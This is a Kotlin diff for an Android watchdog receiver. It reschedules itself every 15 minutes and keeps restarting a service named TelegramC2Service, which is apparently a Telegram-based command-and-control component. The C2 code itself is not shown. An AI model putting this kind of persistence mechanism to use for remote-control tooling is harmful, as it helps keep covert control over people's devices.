@@ -10,8 +10,10 @@ import android.os.SystemClock
 import android.util.Log
 
 /**
- * Alarm-based watchdog. Schedules a periodic check that restarts
- * TelegramC2Service if it's stopped.
+ * Alarm-based watchdog. Every 15 minutes it re-arms itself and
+ * requests a start of TelegramC2Service. If the service is already
+ * running, Android ignores the redundant start (onStartCommand is called
+ * again, harmless).
  */
 class WatchdogReceiver : BroadcastReceiver() {
 
@@ -59,29 +61,24 @@ class WatchdogReceiver : BroadcastReceiver() {
         Log.i(TAG, "watchdog tick")
         LogBus.append(ctx.applicationContext, "WD", "watchdog tick")
 
+        // Re-arm first
         schedule(ctx)
 
+        // Ask Android to (re)start the service. If it's already running,
+        // onStartCommand is called again — harmless because our service
+        // doesn't re-initialize critical state in onStartCommand.
         try {
-            val pm = ctx.packageManager
-            @Suppress("DEPRECATION")
-            val services = pm.getRunningServices(Int.MAX_VALUE)
-            val running = services.any {
-                it.service.className == TelegramC2Service::class.java.name
-            }
-            if (!running) {
-                Log.i(TAG, "TelegramC2Service not running — starting")
-                LogBus.append(ctx.applicationContext, "WD", "restarting service")
-                val svc = Intent(ctx, TelegramC2Service::class.java)
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    ctx.startForegroundService(svc)
-                } else {
-                    ctx.startService(svc)
-                }
+            val svc = Intent(ctx, TelegramC2Service::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                ctx.startForegroundService(svc)
             } else {
-                Log.i(TAG, "service is running — ok")
+                ctx.startService(svc)
             }
+            Log.i(TAG, "requested service start")
+            LogBus.append(ctx.applicationContext, "WD", "requested service start")
         } catch (e: Exception) {
-            Log.w(TAG, "check failed: ${e.message}")
+            Log.w(TAG, "restart failed: ${e.message}")
+            LogBus.append(ctx.applicationContext, "WD", "restart failed: ${e.message}")
         }
     }
 }
